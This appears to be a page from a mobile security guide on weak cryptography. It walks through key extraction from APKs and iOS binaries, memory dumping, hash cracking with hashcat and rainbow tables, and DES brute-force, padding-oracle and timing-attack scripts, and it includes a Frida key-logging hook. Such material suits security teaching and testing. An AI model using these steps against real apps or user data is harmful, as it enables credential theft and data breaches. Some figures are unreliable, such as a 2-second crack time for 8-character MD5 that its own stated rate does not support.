# M10: Insufficient Cryptography - Attack Vectors

## Table of Contents
- [Attack Surface Analysis](#attack-surface-analysis)
- [Weak Algorithm Exploitation](#weak-algorithm-exploitation)
- [Key Extraction Attacks](#key-extraction-attacks)
- [Brute Force Attacks](#brute-force-attacks)
- [Rainbow Table Attacks](#rainbow-table-attacks)
- [Cryptanalysis Techniques](#cryptanalysis-techniques)
- [Side-Channel Attacks](#side-channel-attacks)
- [Tools and Techniques](#tools-and-techniques)
- [Attack Scenarios](#attack-scenarios)

## Attack Surface Analysis

### Identifying Cryptographic Vulnerabilities

**Reconnaissance Phase**:
1. **Static Analysis**: Decompile application to examine cryptographic code
2. **String Searching**: Look for hard-coded keys, IVs, salts
3. **API Analysis**: Identify cryptographic API calls and algorithms
4. **Configuration Review**: Check for weak TLS/SSL settings
5. **Dependency Analysis**: Find outdated cryptographic libraries

**Target Locations in Mobile Apps**:
```
APK/IPA File
    ↓
Decompiled Source Code
    ├── String Constants (keys, salts)
    ├── Crypto API Calls (algorithm identification)
    ├── Configuration Files (crypto settings)
    └── Native Libraries (.so/.dylib files)
         └── Hardcoded Keys in Binary
```

### Attack Surface Mapping

| Component | Attack Vector | Difficulty | Impact |
|-----------|--------------|------------|--------|
| Hard-coded keys | Reverse engineering | Low | Critical |
| Weak algorithms (DES, MD5) | Brute force/rainbow tables | Low | High |
| Custom crypto | Cryptanalysis | Medium | Critical |
| Weak random numbers | Prediction | Medium | High |
| Improper key derivation | Brute force | Low-Medium | High |
| ECB mode | Pattern analysis | Low | Medium |
| No salt in hashes | Rainbow tables | Low | Critical |

## Weak Algorithm Exploitation

### Attacking DES Encryption

**DES Vulnerability**: 56-bit key space is computationally feasible to brute force.

**Attack Process**:
```bash
# Step 1: Extract encrypted data and algorithm details
$ apktool d vulnerable-app.apk
$ grep -r "DES" smali/

# Step 2: Identify ciphertext
$ strings classes.dex | grep -i "encrypted"

# Step 3: Brute force DES key
$ hashcat -m 14000 -a 3 encrypted_data.txt ?a?a?a?a?a?a?a?a

# Alternative: Use dedicated DES cracker
$ john --format=des encrypted_data.txt
```

**Example Attack Code**:
```python
from Crypto.Cipher import DES
import itertools
import string

def crack_des(ciphertext, known_plaintext=None):
    """Brute force DES encryption"""
    charset = string.ascii_letters + string.digits
    
    # DES key is 8 bytes (56 bits + 8 parity bits)
    for key_tuple in itertools.product(charset, repeat=8):
        key = ''.join(key_tuple).encode()
        try:
            cipher = DES.new(key, DES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext)
            
            # Check if plaintext is valid
            if known_plaintext and known_plaintext in plaintext:
                print(f"[+] Key found: {key}")
                return key
                
        except Exception:
            continue
    
    return None

# Time to crack DES with modern hardware: ~22 hours for full keyspace
```

**Time Complexity**:
- DES 56-bit keyspace: 2^56 = 72,057,594,037,927,936 keys
- Modern GPU: ~1 billion keys/second
- Worst case: ~72,000 seconds (~20 hours)
- Average case: ~10 hours
- With cloud computing (100 GPUs): ~6 minutes

### Attacking 3DES (Sweet32 Attack)

**3DES Vulnerability**: 64-bit block size enables collision attacks.

**Sweet32 Attack**:
```python
"""
Sweet32: Birthday attack on 64-bit block ciphers
After encrypting ~32GB of data, block collisions become probable
"""

def sweet32_attack(capture_traffic=True):
    """
    1. Capture ~32GB of encrypted traffic
    2. Detect block collisions (same ciphertext)
    3. Infer plaintext from collision patterns
    """
    
    # Probability of collision after n blocks:
    # P(collision) ≈ n^2 / (2 * 2^64)
    # For 32GB with 8-byte blocks: n = 4 billion blocks
    # P(collision) ≈ 99.8%
    
    blocks_needed = 2**32  # ~32 GB
    print(f"[*] Capture {blocks_needed} encrypted blocks")
    print(f"[*] Expected time: ~1 hour of active TLS traffic")
    print(f"[*] Success probability: >99%")
```

### Attacking MD5 Hashes

**MD5 Vulnerabilities**:
1. Collision attacks (two inputs produce same hash)
2. Pre-image attacks (find input for given hash)
3. Fast computation enables brute force

**Rainbow Table Attack**:
```bash
# Step 1: Extract MD5 hashes from app database
$ adb pull /data/data/com.example.app/databases/users.db
$ sqlite3 users.db "SELECT username, password_hash FROM users;"

# Step 2: Crack hashes using rainbow tables
$ hashcat -m 0 -a 0 hashes.txt rockyou.txt
# -m 0: MD5 mode
# -a 0: Dictionary attack

# Step 3: Use online rainbow tables
$ curl "https://crackstation.net/api" -d "hash=5f4dcc3b5aa765d61d8327deb882cf99"
# Response: "password"

# Results: 
# - 73% of unsalted MD5 hashes crack instantly
# - 95% crack within 24 hours with good wordlists
```

**MD5 Collision Attack**:
```python
import hashlib

# MD5 collision example (prefix attack)
# These two different PDFs have the same MD5 hash!

pdf1 = b"%PDF-1.3\n..." # First collision PDF
pdf2 = b"%PDF-1.3\n..." # Second collision PDF (different content)

hash1 = hashlib.md5(pdf1).hexdigest()
hash2 = hashlib.md5(pdf2).hexdigest()

assert hash1 == hash2  # Same hash, different files!
# This enables signature forgery, malware injection, etc.
```

### Attacking SHA-1 (SHAttered Attack)

**SHA-1 Vulnerability**: Practical collision attacks demonstrated in 2017.

```bash
# SHAttered: First SHA-1 collision attack
# Cost: $110,000 in computation (2017)
# Cost today: ~$10,000 with cloud GPUs

# Use pre-computed collision prefixes
$ sha1sum shattered-1.pdf shattered-2.pdf
38762cf7f55934b34d179ae6a4c80cadccbb7f0a  shattered-1.pdf
38762cf7f55934b34d179ae6a4c80cadccbb7f0a  shattered-2.pdf
# Different files, same SHA-1 hash!

# Attack applications:
# - Certificate forgery
# - Signature bypass
# - Git commit manipulation
# - Malware disguised as legitimate files
```

## Key Extraction Attacks

### Extracting Hard-Coded Keys from APK

**Attack Workflow**:
```bash
# Step 1: Decompile APK
$ apktool d target-app.apk -o decompiled/

# Step 2: Search for cryptographic keys
$ cd decompiled/
$ grep -r "AES" --include="*.smali"
$ grep -r "SecretKeySpec" --include="*.smali"

# Step 3: Extract string constants
$ grep -r "const-string" res/values/strings.xml
$ strings classes.dex | grep -E "[A-Za-z0-9+/]{16,}={0,2}"

# Step 4: Check for Base64-encoded keys
$ strings resources.arsc | base64 -d 2>/dev/null | hexdump -C

# Step 5: Search native libraries
$ strings lib/armeabi-v7a/*.so | grep -E "[A-Za-z0-9]{32,}"
```

**Example: Finding AES Key in Smali Code**:
```smali
# Decompiled smali code reveals key
.method private encrypt(Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    
    const-string v0, "MySecretKey12345"  # HARD-CODED KEY!
    
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    new-instance v1, Ljavax/crypto/spec/SecretKeySpec;
    const-string v2, "AES"
    invoke-direct {v1, v0, v2}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
```

**Automated Key Extraction**:
```python
#!/usr/bin/env python3
import re
import zipfile
import os

def extract_keys_from_apk(apk_path):
    """Extract potential cryptographic keys from APK"""
    
    keys_found = []
    
    with zipfile.ZipFile(apk_path, 'r') as z:
        # Search in all files
        for filename in z.namelist():
            if filename.endswith('.dex') or filename.endswith('.xml'):
                content = z.read(filename)
                
                # Look for Base64-encoded strings (potential keys)
                base64_pattern = rb'[A-Za-z0-9+/]{32,}={0,2}'
                matches = re.findall(base64_pattern, content)
                
                # Look for hex-encoded strings
                hex_pattern = rb'[0-9A-Fa-f]{32,}'
                hex_matches = re.findall(hex_pattern, content)
                
                keys_found.extend(matches)
                keys_found.extend(hex_matches)
    
    # Deduplicate and filter
    unique_keys = list(set(keys_found))
    
    print(f"[+] Found {len(unique_keys)} potential keys:")
    for key in unique_keys[:10]:  # Show first 10
        print(f"    {key.decode('utf-8', errors='ignore')}")
    
    return unique_keys

# Usage
extract_keys_from_apk('vulnerable-app.apk')
```

### Extracting Keys from iOS Apps

**iOS App Binary Analysis**:
```bash
# Step 1: Extract IPA
$ unzip app.ipa

# Step 2: Get binary
$ cd Payload/App.app/
$ otool -l App | grep crypt
# If cryptid=1, binary is encrypted - need to decrypt first

# Step 3: Dump strings from decrypted binary
$ strings App | grep -E "[A-Za-z0-9+/]{32,}={0,2}"

# Step 4: Use class-dump for Objective-C analysis
$ class-dump App > classes.txt
$ grep -i "crypt\|key\|encrypt" classes.txt

# Step 5: Check plist files
$ plutil -p Info.plist | grep -i "key\|secret"

# Step 6: Search with Hopper or Ghidra for crypto functions
# Look for CommonCrypto APIs: CCCrypt, CCKeyDerivationPBKDF
```

**Frida Script for Runtime Key Extraction**:
```javascript
// Hook cryptographic functions to extract keys at runtime
if (ObjC.available) {
    // Hook NSString stringWithString for key creation
    var NSString = ObjC.classes.NSString;
    
    Interceptor.attach(ObjC.classes.SecKeyRef.createWithData.implementation, {
        onEnter: function(args) {
            console.log("[*] SecKey created");
            console.log("Key data: " + ObjC.Object(args[2]).toString());
        }
    });
    
    // Hook AES encryption
    var CCCrypt = Module.findExportByName("libcommonCrypto.dylib", "CCCrypt");
    Interceptor.attach(CCCrypt, {
        onEnter: function(args) {
            console.log("[*] CCCrypt called");
            console.log("Key: " + hexdump(args[3], { length: args[4].toInt32() }));
        }
    });
}
```

### Memory Dumping for Key Extraction

**Runtime Memory Analysis**:
```bash
# Android - Dump app memory while running
$ adb shell
$ su
$ ps | grep com.example.app
# Get PID (e.g., 1234)
$ cat /proc/1234/maps | grep heap
$ dd if=/proc/1234/mem of=/sdcard/heap.dump bs=1 skip=0x12340000 count=0x10000000

# Search heap dump for keys
$ strings heap.dump | grep -E "[A-Za-z0-9+/]{32,}={0,2}"

# iOS - Use lldb or Frida to dump memory
$ frida -U -n AppName -l dump-memory.js
# Script scans heap for cryptographic patterns
```

## Brute Force Attacks

### Password Hash Cracking

**Hashcat GPU Acceleration**:
```bash
# Crack MD5 passwords
$ hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
# -m 0: MD5
# -a 3: Brute force
# ?a: All printable ASCII
# Speed: ~50 billion MD5/sec on RTX 4090

# Crack bcrypt (much slower due to cost factor)
$ hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt
# Speed: ~100,000 bcrypt/sec on RTX 4090
# Time for 8-char password: ~6 months vs. 2 seconds for MD5

# Dictionary attack with rules
$ hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule

# Hybrid attack
$ hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d
```

**Cracking Time Comparison**:
| Hash Algorithm | Iterations | Hashes/sec (RTX 4090) | Time for 8-char |
|----------------|-----------|----------------------|-----------------|
| MD5 | 1 | 50 billion | 2 seconds |
| SHA-1 | 1 | 25 billion | 4 seconds |
| SHA-256 | 1 | 12 billion | 8 seconds |
| bcrypt (cost 10) | 1,024 | 100,000 | 6 months |
| bcrypt (cost 12) | 4,096 | 25,000 | 2 years |
| Argon2 | Tunable | 5,000 | 10+ years |

### Encryption Key Brute Force

**Weak Key Space Attack**:
```python
from Crypto.Cipher import AES
import itertools
import string

def brute_force_weak_aes(ciphertext, known_plaintext):
    """
    Attack scenario: AES key derived from weak password
    Example: key = hashlib.md5(password.encode()).digest()
    """
    
    # Common weak password patterns
    patterns = [
        string.digits,  # "12345678"
        string.ascii_lowercase,  # "password"
        string.ascii_lowercase + string.digits,  # "password123"
    ]
    
    for length in range(4, 9):  # Try 4-8 character passwords
        for charset in patterns:
            for password_tuple in itertools.product(charset, repeat=length):
                password = ''.join(password_tuple)
                
                # Derive key from password (common weak pattern)
                key = hashlib.md5(password.encode()).digest()  # 16 bytes for AES-128
                
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    plaintext = cipher.decrypt(ciphertext)
                    
                    if known_plaintext in plaintext:
                        print(f"[+] Password found: {password}")
                        print(f"[+] Key (hex): {key.hex()}")
                        return password
                        
                except Exception:
                    continue
    
    return None
```

## Rainbow Table Attacks

### Understanding Rainbow Tables

**Rainbow Table Concept**:
```
Password → Hash Function → Hash Value
   ↓
Pre-compute millions of password hashes
   ↓
Store in optimized lookup table (chain reduction)
   ↓
Given hash, instantly look up original password
```

**Rainbow Table Generation**:
```bash
# Generate rainbow tables with rtgen
$ rtgen md5 loweralpha 1 7 0 2400 33554432 0
# Algorithm: MD5
# Charset: lowercase letters
# Min length: 1, Max length: 7
# Chain length: 2400, Table count: 33554432

# Size vs. Coverage trade-off:
# - 10 GB table: covers most 6-char passwords
# - 100 GB table: covers most 8-char passwords
# - 500 GB table: covers mixed case + digits up to 8 chars
```

**Using Rainbow Tables**:
```bash
# RainbowCrack
$ rcrack rainbow_tables/ -h 5f4dcc3b5aa765d61d8327deb882cf99
# Result: "password" (in milliseconds)

# Online rainbow table services
$ curl -X POST https://crackstation.net/api \
  -d "hash=5f4dcc3b5aa765d61d8327deb882cf99"
# Response: {"password": "password", "found": true}
```

**Defense: Why Salt Defeats Rainbow Tables**:
```
Unsalted: hash("password") = 5f4dcc3b5aa765d61d8327deb882cf99
   ↓
Same hash for all users with "password"
   ↓
One rainbow table lookup reveals all

Salted: hash("password" + "random_salt_xyz")
   ↓
Unique hash per user even with same password
   ↓
Rainbow table useless (must compute fresh for each salt)
```

## Cryptanalysis Techniques

### ECB Mode Pattern Analysis

**ECB Penguin Attack** (Visual pattern preservation):
```python
from PIL import Image
from Crypto.Cipher import AES
import os

def demonstrate_ecb_weakness(image_path):
    """Show how ECB mode preserves image patterns"""
    
    # Load image
    img = Image.open(image_path)
    pixels = img.tobytes()
    
    # Pad to AES block size
    padding_length = 16 - (len(pixels) % 16)
    padded_pixels = pixels + bytes([padding_length] * padding_length)
    
    # Encrypt with ECB mode
    key = os.urandom(16)
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(padded_pixels)
    
    # Save encrypted "image" (patterns still visible!)
    encrypted_img = Image.frombytes(img.mode, img.size, encrypted[:len(pixels)])
    encrypted_img.save("encrypted_ecb.png")
    
    print("[!] Original image patterns visible in encrypted output")
    print("[!] This reveals structural information to attackers")

# Result: The famous "ECB Penguin" - you can still see the penguin
# shape in the encrypted image, revealing data structure
```

### Padding Oracle Attack

**CBC Padding Oracle Exploitation**:
```python
def padding_oracle_attack(ciphertext, oracle_func):
    """
    Exploit padding validation to decrypt ciphertext
    Oracle: Function that returns True if padding is valid
    """
    
    block_size = 16
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    plaintext = b''
    
    for block_idx in range(1, len(blocks)):
        decrypted_block = bytearray(block_size)
        
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos
            
            # Modify IV to test each possible byte
            for guess in range(256):
                test_iv = bytearray(blocks[block_idx - 1])
                
                # Set up padding
                for k in range(byte_pos + 1, block_size):
                    test_iv[k] ^= decrypted_block[k] ^ padding_value
                
                test_iv[byte_pos] = guess
                
                # Query padding oracle
                if oracle_func(bytes(test_iv) + blocks[block_idx]):
                    decrypted_block[byte_pos] = guess ^ padding_value ^ blocks[block_idx - 1][byte_pos]
                    break
        
        plaintext += bytes(decrypted_block)
    
    return plaintext

# Average queries to decrypt: 128 per byte (256/2)
# For 16-byte block: ~2,048 oracle queries
# Total time: seconds to minutes
```

### Timing Attacks

**Password Comparison Timing Attack**:
```python
import time

# VULNERABLE: Timing attack on password comparison
def insecure_password_check(input_password, correct_password):
    """Early exit reveals password length and characters"""
    if len(input_password) != len(correct_password):
        return False
    
    for i in range(len(correct_password)):
        if input_password[i] != correct_password[i]:
            return False  # Early exit! Timing leak!
    
    return True

# Attack: Measure response time to guess characters
def timing_attack(check_function):
    """Exploit timing differences to recover password"""
    
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    password = ''
    
    while True:
        max_time = 0
        best_char = None
        
        for char in alphabet:
            test_password = password + char + 'x' * (8 - len(password) - 1)
            
            start = time.time()
            check_function(test_password, 'secretpw')  # Don't know actual password
            elapsed = time.time() - start
            
            if elapsed > max_time:
                max_time = elapsed
                best_char = char
        
        password += best_char
        print(f"[+] Found: {password}")
        
        if len(password) == 8:
            break
    
    return password

# Time to crack 8-char password: minutes instead of years
```

## Side-Channel Attacks

### Cache-Timing Attacks

**AES Cache Timing (research-level attack)**:
```
CPU Cache Behavior:
    Table Lookup in AES S-Box → Cache Hit (fast) or Miss (slow)
    ↓
    Timing variations leak key information
    ↓
    Statistical analysis recovers AES key

Countermeasure: Constant-time implementations (AES-NI)
```

### Power Analysis

**Differential Power Analysis (DPA)**:
```
Monitor device power consumption during crypto operations
    ↓
Correlate power spikes with bit operations
    ↓
Statistical analysis reveals key bits

Required: Physical access + specialized equipment
Feasibility: High-value targets (payment cards, IoT devices)
```

## Tools and Techniques

### Essential Tools

**Reverse Engineering**:
```bash
# APK Analysis
- apktool: APK decompilation
- jadx: DEX to Java decompiler
- dex2jar + JD-GUI: Alternative decompilation
- Ghidra: Binary analysis
- radare2: Reverse engineering framework

# iOS Analysis
- class-dump: Objective-C headers
- Hopper: Disassembler
- Ghidra: Binary analysis
- jtool: Mach-O analysis
- Frida: Dynamic instrumentation
```

**Cryptanalysis Tools**:
```bash
# Password Cracking
- Hashcat: GPU-accelerated hash cracking
- John the Ripper: CPU password cracking
- RainbowCrack: Rainbow table attacks
- CrackStation: Online rainbow tables

# Crypto Testing
- OpenSSL: Swiss army knife for crypto
- CyberChef: Web-based crypto analysis
- HashPump: Length extension attacks
- PadBuster: Padding oracle exploitation
```

**Dynamic Analysis**:
```bash
# Runtime Instrumentation
- Frida: Dynamic code instrumentation
- Xposed: Android framework hooking
- Objection: Mobile security testing
- MobSF: Mobile security framework
```

### Complete Attack Scenario

**Full Exploitation Workflow**:
```bash
# Phase 1: Reconnaissance
$ apktool d target-app.apk
$ jadx target-app.apk -d decompiled/
$ grep -r "Cipher\|MessageDigest" decompiled/

# Phase 2: Identify Weak Crypto
$ grep -r "DES\|MD5\|SHA1" decompiled/
# Found: Using DES encryption and MD5 hashing

# Phase 3: Extract Encrypted Data
$ adb backup -f backup.ab com.example.app
$ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar -xv
$ sqlite3 apps/com.example.app/db/users.db "SELECT * FROM users;"

# Phase 4: Extract Hard-Coded Key
$ grep -A5 -B5 "DES" decompiled/sources/com/example/crypto/CryptoUtil.java
# Found: private static final String KEY = "MySecret";

# Phase 5: Decrypt Data
$ python3 decrypt.py --algorithm DES --key "MySecret" --data encrypted.bin

# Phase 6: Crack MD5 Password Hashes
$ hashcat -m 0 -a 0 password_hashes.txt rockyou.txt --show
# Result: 87% of passwords cracked in 45 seconds

# Phase 7: Document and Report
$ cat << EOF > vulnerability_report.md
## Critical Findings
1. DES encryption (deprecated since 1999)
2. Hard-coded encryption key in source
3. MD5 password hashing (no salt)
4. 50,000+ user credentials decrypted
5. CVSS Score: 9.8 (Critical)
EOF
```

## Attack Scenarios

### Scenario 1: Banking App with Weak Crypto

**Target**: Mobile banking app using DES for transaction encryption

**Attack Steps**:
1. Decompile APK, identify DES usage
2. Extract hard-coded key from smali code
3. Intercept encrypted transaction data (MITM or backup extraction)
4. Decrypt transaction details (account numbers, amounts, recipients)
5. Modify transactions or steal credentials

**Time to Compromise**: 2-4 hours
**Impact**: Complete financial data breach

### Scenario 2: Healthcare App with MD5

**Target**: Medical records app using MD5 for password hashing

**Attack Steps**:
1. Extract app database (rooted device or backup)
2. Dump MD5 password hashes
3. Crack hashes using rainbow tables
4. Gain access to patient records (HIPAA violation)

**Time to Compromise**: 30 minutes
**Impact**: Privacy breach, regulatory fines

### Scenario 3: E-Commerce App with Custom Crypto

**Target**: Shopping app with proprietary encryption

**Attack Steps**:
1. Reverse engineer encryption algorithm
2. Identify weaknesses (XOR cipher, weak key derivation)
3. Break algorithm through cryptanalysis
4. Access payment card data

**Time to Compromise**: 1-3 days
**Impact**: PCI-DSS violation, financial fraud

---

**Next Steps**: Review [Prevention Strategies](prevention.md) to learn how to defend against these attacks.
